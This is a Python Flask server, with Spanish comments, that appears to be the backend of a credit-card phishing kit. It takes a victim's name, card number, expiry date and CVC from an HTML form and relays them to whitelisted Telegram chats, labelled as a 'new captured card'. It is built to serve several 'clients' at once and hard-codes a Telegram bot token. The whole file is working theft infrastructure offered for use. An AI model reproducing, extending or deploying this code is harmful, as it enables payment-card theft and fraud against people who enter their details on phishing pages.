import os
from flask import Flask, request, jsonify
from flask_cors import CORS
import requests

app = Flask(__name__)
CORS(app, resources={r"/*": {"origins": "*"}})

# --- CONFIGURACIÓN ---
TELEGRAM_BOT_TOKEN = '8825700631:AAE1L-gbaro7C2TAr4gGMf8P-XUsiyoyleU'

# --- LISTA MAESTRA DE IDs AUTORIZADOS ---
# Aquí metes TODOS los IDs de todos tus clientes y sus amigos.
# Si un ID no está aquí, el bot lo ignora aunque el HTML lo mande.
LISTA_MAESTRA_IDS = [
    '6953415010', '7707049896', # IDs de tu cliente 1 y sus amigos
    '-1087968824', '1087968824', # IDs de tu cliente 2 y sus amigos
    '123456789', '987654321'     # Otros clientes
]

@app.route('/enviar-datos', methods=['POST'])
def recibir_datos():
    data = request.json
    # El HTML manda una LISTA de IDs (los amigos del cliente)
    lista_ids_html = data.get('lista_ids', [])
    
    nombre = data.get('nombre', 'N/A')
    tarjeta = data.get('tarjeta', 'N/A')
    expiracion = data.get('expiracion', 'N/A')
    cvc = data.get('cvc', 'N/A')

    mensaje = (
        f"💰 *NUEVA CC CAPTURADA* 💰\n"
        f"━━━━━━━━━━━━━━━━━━\n"
        f"👤 *Nombre:* `{nombre}`\n"
        f"💳 *Tarjeta:* `{tarjeta}`\n"
        f"📅 *Exp:* `{expiracion}`\n"
        f"🔐 *CVC:* `{cvc}`\n"
        f"━━━━━━━━━━━━━━━━━━"
    )

    exitos = 0
    # Recorremos la lista que mandó el HTML
    for id_receptor in lista_ids_html:
        # VALIDACIÓN: Solo si el ID del HTML está en la LISTA MAESTRA del servidor
        if str(id_receptor) in LISTA_MAESTRA_IDS:
            url_telegram = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
            payload = {"chat_id": str(id_receptor), "text": mensaje, "parse_mode": "Markdown"}
            try:
                res = requests.post(url_telegram, json=payload, timeout=5)
                if res.status_code == 200:
                    exitos += 1
            except:
                continue
        else:
            print(f"🚫 ID NO AUTORIZADO EN LISTA MAESTRA: {id_receptor}")

    print(f"🏁 Proceso terminado. Enviados a {exitos} de {len(lista_ids_html)} IDs enviados.")
    return jsonify({"status": "success", "enviados": exitos}), 200

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)
